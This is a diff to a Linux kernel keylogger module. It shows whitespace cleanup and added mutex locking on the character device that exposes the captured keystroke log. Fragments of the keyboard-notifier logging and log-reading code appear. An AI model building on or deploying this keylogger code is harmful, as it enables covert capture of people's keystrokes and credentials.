@@ -63,7 +63,7 @@ static int __init my_key_logger_init(void){
     return majourNumber;
   }
   printk(KERN_INFO "%s: registered majour num", CLASS_NAME);
-  
+
   // register dev class
   mkl_class = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(mkl_class)) {
@@ -90,7 +90,7 @@ static int __init my_key_logger_init(void){
 
   // mutex initialization
   mutex_init(&mkl_mutex);
-  
+
   return 0;
 }
 
@@ -101,13 +101,18 @@ static void __exit my_key_logger_exit(void){
   class_destroy(mkl_class);
   unregister_chrdev(majourNumber, DEVICE_NAME);
   unregister_keyboard_notifier(&nb);
-  
-  printk(KERN_INFO "MKL: %s is Unloaded!\n", module_name);  
+
+  printk(KERN_INFO "MKL: %s is Unloaded!\n", module_name);
 }
 
 static int dev_open(struct inode *inode_p, struct file * file_p) {
+  if (!mutex_trylock(&mkl_mutex)) {
+    printk(KERN_INFO "%s: Can't lock mutex.\n", DEVICE_NAME);
+    return -EBUSY;
+  }
+
   printk(KERN_INFO "%s: Open\n", CLASS_NAME);
-  
+
   return 0;
 }
 
@@ -119,7 +124,7 @@ static ssize_t dev_read(struct file *file_p, char *buffer, size_t length, loff_t
     printk(KERN_INFO "%s: Send %d characters.\n", CLASS_NAME, len);
     memset(log, 0, LOG_MAX);
     log_p = log;
-    
+
     return len;
   } else {
     printk(KERN_INFO "%s: Failed Sent\n", CLASS_NAME);
@@ -133,6 +138,7 @@ static ssize_t dev_write(struct file *file_p, const char *buffer, size_t len, lo
 }
 
 static int dev_release(struct inode *inode_p, struct file *file_p) {
+  mutex_unlock(&mkl_mutex);
   printk(KERN_INFO "%s: close\n", CLASS_NAME);
   return 0;
 }
@@ -157,7 +163,7 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action, void *d
       log_p = log;
     }
   }
-  
+
   return NOTIFY_OK; // everything ok
 }
 
